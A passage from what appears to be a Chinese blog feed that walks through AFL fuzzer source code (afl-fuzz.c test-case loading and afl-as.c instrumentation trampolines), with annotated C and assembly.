open /dev/urandom&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Gnuplot output file. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//以只写方式打开out_dir/plot_data文件，如果文件不存在就创建，返回句柄fd</span></span><br><span class="line">  tmp = alloc_printf(<span class="string">&quot;%s/plot_data&quot;</span>, out_dir);</span><br><span class="line">  fd = open(tmp, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0600</span>);</span><br><span class="line">  <span class="comment">/*O_CREAT:如果指定文件不存在，则创建这个文件</span></span><br><span class="line"><span class="comment">    O_EXCL :如果要创建的文件已存在，则返回 -1，并且修改 errno 的值*/</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, tmp);</span><br><span class="line">  ck_free(tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//根据句柄得到FILE结构体指针plot_file</span></span><br><span class="line">  plot_file = fdopen(fd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!plot_file) PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(plot_file, <span class="string">&quot;# unix_time, cycles_done, cur_path, paths_total, &quot;</span></span><br><span class="line">                     <span class="string">&quot;pending_total, pending_favs, map_size, unique_crashes, &quot;</span></span><br><span class="line">                     <span class="string">&quot;unique_hangs, max_depth, execs_per_sec\n&quot;</span>);</span><br><span class="line">                     <span class="comment">/* ignore errors */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases()"></a>read_testcases()</h2><p>从输入文件夹中读取所有文件，然后将它们排队进行测试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">read_testcases</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> **<span class="title">nl</span>;</span></span><br><span class="line">  s32 nl_cnt;</span><br><span class="line">  u32 i;</span><br><span class="line">  u8* fn;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Auto-detect non-in-place resumption attempts. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//访问in_dir/queue文件夹，如果存在就设置in_dir为in_dir/queue</span></span><br><span class="line">  fn = alloc_printf(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line">  <span class="keyword">if</span> (!access(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> ck_free(fn);</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span></span><br><span class="line"><span class="comment">     the ordering  of test cases would vary somewhat randomly and would be</span></span><br><span class="line"><span class="comment">     difficult to control. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//扫描in_dir，并将扫描结果排好序后放入nl，匹配到的文件个数存储在nl_cnt中</span></span><br><span class="line">  nl_cnt = scandir(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line">  <span class="comment">/*第一个参数：扫描的路径</span></span><br><span class="line"><span class="comment">    第二个参数：扫描结果保存的列表</span></span><br><span class="line"><span class="comment">    第三个参数：指向过滤函数，对参数一进行过滤，如果是NULL,则扫描一参目录下的所有顶层文件</span></span><br><span class="line"><span class="comment">    第四个参数：将过滤后的结果进行排序*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//如果没有扫描到匹配文件</span></span><br><span class="line">  <span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line"></span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果设置了shuffle_queue，且扫描到了匹配文件</span></span><br><span class="line">  <span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    ACTF(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">    <span class="comment">//利用shuffle_ptrs函数重排nl里的指针位置</span></span><br><span class="line">    shuffle_ptrs((<span class="keyword">void</span>**)nl, nl_cnt);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//遍历nl,nl[i]-&gt;d_name的值为input文件夹下的文件名,例如a.out</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="comment">//目录</span></span><br><span class="line">    u8* fn = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    u8* dfn = alloc_printf(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//从fn获取文件信息并保存在st中，检测目录是否可以访问，访问不了报错</span></span><br><span class="line">    <span class="keyword">if</span> (lstat(fn, &amp;st) || access(fn, R_OK))</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line">    <span class="comment">//判断st.st_mode是否是一个常规文件，st.st_size确定文件大小，strstr匹配文件是否是README.txt</span></span><br><span class="line">    <span class="comment">//排除干扰文件，如.或..或README</span></span><br><span class="line">    <span class="keyword">if</span> (!S_ISREG(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.txt&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      ck_free(fn);</span><br><span class="line">      ck_free(dfn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果是有效文件，检查文件大小是否超过规定值界限，默认1024*1024字节，即1M</span></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">      FATAL(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">            DMS(st.st_size), DMS(MAX_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">       is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">       fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">       and probably very time-consuming. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查dfn是否创建成功，即in_dir/.state/deterministic_done/nl[i]-&gt;d_name</span></span><br><span class="line">    <span class="keyword">if</span> (!access(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line">    ck_free(dfn);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将fd文件入队</span></span><br><span class="line">    add_to_queue(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(nl); <span class="comment">/* not tracked */</span></span><br><span class="line">  <span class="comment">//如果没有入队的输入文件</span></span><br><span class="line">  <span class="keyword">if</span> (!queued_paths) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Looks like there are no valid test cases in the input directory! The fuzzer\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    needs one or more test case to start with - ideally, a small file under\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    1 kB or so. The cases must be stored as regular files directly in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    input directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FATAL(<span class="string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  last_path_time = <span class="number">0</span>;</span><br><span class="line">  queued_at_start = queued_paths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto()"></a>load_auto()</h2><p>load自动生成的提取出来的词典token</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">load_auto</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line">  <span class="comment">//循环遍历从0到USE_AUTO_EXTRAS，默认50</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; USE_AUTO_EXTRAS; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u8  tmp[MAX_AUTO_EXTRA + <span class="number">1</span>];</span><br><span class="line">    u8* fn = alloc_printf(<span class="string">&quot;%s/.state/auto_extras/auto_%06u&quot;</span>, in_dir, i);</span><br><span class="line">    s32 fd, len;</span><br><span class="line">    <span class="comment">//以只读的方式打开fn获得句柄fd</span></span><br><span class="line">    fd = open(fn, O_RDONLY, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打开失败报错</span></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (errno != ENOENT) PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">      ck_free(fn);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We read one byte more to cheaply detect tokens that are too</span></span><br><span class="line"><span class="comment">       long (and skip them). */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//从fd读取MAX_AUTO_EXTRA + 1个字节到tmp中</span></span><br><span class="line">    <span class="comment">//MAX_AUTO_EXTRA默认32，是最大大小，+1判断读取是否过长</span></span><br><span class="line">    len = read(fd, tmp, MAX_AUTO_EXTRA + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//没读取到报错</span></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to read from &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">    <span class="comment">/*如果读取的长度在MIN_AUTO_EXTRA(3)和MAX_AUTO_EXTRA(32)之间</span></span><br><span class="line"><span class="comment">      调用maybe_add_auto函数*/</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt;= MIN_AUTO_EXTRA &amp;&amp; len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">      maybe_add_auto(tmp, len);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">    ck_free(fn);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (i) OKF(<span class="string">&quot;Loaded %u auto-discovered dictionary tokens.&quot;</span>, i);</span><br><span class="line">  <span class="keyword">else</span> OKF(<span class="string">&quot;No auto-generated dictionary tokens to reuse.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 源码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL源码分析之afl-as.c</title>
      <link href="/2022/03/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bafl-as-c/"/>
      <url>/2022/03/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bafl-as-c/</url>
      
        <content type="html"><![CDATA[<p> 上一篇分析 afl-gcc.c 中有说到，afl-gcc.c 好像并没有执行插桩的操作，只是进行了一些检查，对参数进行了一些整理。</p><p>看了一些博客后发现果不其然，插桩发生在 afl-as.c</p><h2 id="重要代码"><a href="#重要代码" class="headerlink" title="重要代码"></a>重要代码</h2><p>首先要知道插桩是什么，插桩说得通俗一点就是在代码里面插代码，再具体一点就是在程序编译期间插入汇编代码(伪代码)，记录覆盖率。</p><p>而编译程序就是通过 afl-gcc/afl-clang 等工具完成，这个过程会对程序进行插桩。参考网上师傅写的博客，讲一下 afl-as.c 是怎么工作的，以 afl-gcc 为例，添加一些输出使得在调用 afl-gcc.c 的 <code>execvp()</code>之前打印全部命令行参数，看看 afl-gcc 究竟执行了啥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc &#x2F;tmp&#x2F;hello.c -B &#x2F;root&#x2F;src&#x2F;afl-2.52b -g -O3 -funroll-loops -D__AFL_COMPILER&#x3D;1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION&#x3D;1</span><br></pre></td></tr></table></figure><p>可以看到，afl-gcc最终调用的是 gcc，同时定义了一些宏，设置了一些参数。最关键的是<code>-B /root/src/afl-2.52b</code>，<code>-B</code></p><p>选项用于设置编译器的搜索路径，这里相当于设置成了<code>/root/src/afl-2.52b</code>(这里设置的是AFL_PATH，也就是AFL的目录)</p><p>在 “源代码”-&gt;“汇编代码”-&gt;“二进制” 过程中，将汇编代码编译成二进制的工具——汇编器，Linux中常用的汇编器是<code>as</code>。在<strong>编译完成</strong>AFL后，当前目录下会出现一个<code>as</code>文件，并作为符号链接指向<code>afl-as</code>。而之前又通过<code>-B</code>参数设置了搜索路径，那么<code>afl-as</code>便会作为汇编器，执行汇编操作， afl-as 就会在这个时候插桩。</p><p>afl-as.c 中插桩代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fprintf(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));&#x2F;&#x2F;插桩</span><br></pre></td></tr></table></figure><p>通过 fprintf() 将代码添加到汇编文件的相应位置，分析 32 位的情况：</p><p><code>trampoline_fmt_32</code>的具体内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">static const u8* trampoline_fmt_32 &#x3D;</span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;&#x2F;* --- AFL TRAMPOLINE (32-BIT) --- *&#x2F;\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.align 4\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;movl %%edi, 0(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%edx, 4(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%ecx, 8(%%esp)\n&quot;</span><br><span class="line">  &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">  &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">  &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">  &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">  &quot;movl 8(%%esp), %%ecx\n&quot;</span><br><span class="line">  &quot;movl 4(%%esp), %%edx\n&quot;</span><br><span class="line">  &quot;movl 0(%%esp), %%edi\n&quot;</span><br><span class="line">  &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;&#x2F;* --- END --- *&#x2F;\n&quot;</span><br><span class="line">  &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>这一段代码主要操作是：</p><ul><li>保存<code>edi</code>等寄存器</li><li>将<code>ecx</code> 的值设置为 fprintf() 所要打印的内容</li><li>调用<code>__afl_maybe_log</code></li><li>恢复寄存器</li></ul><p><code>R(MAP_SIZE)</code>对应的就是<code>ecx</code>，根据定义，宏<code>MAP_SIZE</code>为 64k，<code>R(x)</code>的定义是<code>(random() % (x))</code>，所以<code>R(MAP_SIZE)</code>为0 到 MAP_SIZE 之间的一个随机数。</p><p>因此，在处理到某个分支，需要插入桩代码时，<code>afl-as</code>会生成一个随机数，作为运行时保存在<code>ecx</code>中的值。而这个随机数，便是用于标识这个代码块的key。</p><h2 id="全部代码"><a href="#全部代码" class="headerlink" title="全部代码"></a>全部代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span 